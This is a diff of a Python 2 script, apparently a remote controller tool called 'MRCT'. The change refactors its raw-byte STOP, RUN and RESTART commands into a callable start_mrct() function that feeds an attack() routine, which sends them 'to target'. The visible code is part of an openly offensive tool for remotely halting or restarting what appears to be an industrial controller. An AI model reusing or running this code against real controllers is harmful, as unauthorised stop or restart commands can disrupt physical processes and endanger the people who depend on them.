@@ -37,20 +37,13 @@ DEBUG = False
 # ************
 # Command list
 # ************
-#start
-start = key + "\x40\xff\x00"
-#stop
-stop = key + "\x41\xff\x00"
+
 # enter_user_mode
 enter_user_mode = key + "\x11"
-# restart_controller
-restart_controller = "\x00\x42\x00\x00"
 
 
-# **************
-# Commands array 
-# **************
-packets = [stop] # insert commands to execute here (stop/start)
+
+
 
 
 banner = """\
@@ -64,11 +57,15 @@ banner = """\
 + ======================================================================================
 """
 
+command = ""
 msg = ""
 fError = 0
 rsid = ""
 payload = ""
 s = ""
+packets = [command]  # insert commands to execute here (stop/start)
+
+
 
 def start_banner():
     print banner
@@ -116,7 +113,7 @@ def attack():
         s.close()
 
     try:
-        print "[MRCT] Sending remote commands...\r\n"
+        print "[MRCT] Sending remote command(s)...\r\n"
         for packet in packets:            
             generate_packet(packet)
             if DEBUG == True:
@@ -169,8 +166,24 @@ def catch_res():
         print msg
     
 
-if __name__ == '__main__':
-    start_banner()
+def start_mrct(key, comm):
+    global command
+
+    if comm == "STOP":
+        # stop
+        command = key + "\x41\xff\x00"
+
+    if comm == "RUN":
+        # start
+        command = key + "\x40\xff\x00"
+
+    if comm == "RESTART":
+        # restart_controller
+        command = "\x00\x42\x00\x00"
+
+    #start_banner()
     attack()
     s.close()
-    print "[MRCT] Command sent to target.\r\n\r\n"
+    if DEBUG == True:
+        print "[MRCT] " + str(comm) + " command sent to target.\r\n\r\n"
+    return "[MRCT] " + str(comm) + " command sent to target.\r\n"
